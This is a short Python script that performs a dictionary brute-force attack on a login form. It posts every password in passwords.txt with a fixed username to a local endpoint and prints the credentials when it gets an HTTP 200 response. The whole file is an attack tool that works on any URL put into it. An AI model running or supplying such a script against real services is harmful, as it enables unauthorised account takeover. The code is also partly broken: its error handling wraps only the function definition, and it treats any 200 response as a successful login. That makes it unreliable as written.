import requests
import time
import sys

url = "http://localhost:5000/postpassword"
username = "hello@gmail.com"
error = "Error message"


try:
    def bruteCracking(username, url, error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            # print("Trying Password: " + str(count) + ' Time For => ' + password)
            data_dict = {"username": username,
                         "password": password}
            response = requests.post(url, data_dict)
            # print(response)
            if(int(response.status_code) == 200):
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(username, url, error)

print("[!!] password not in list")
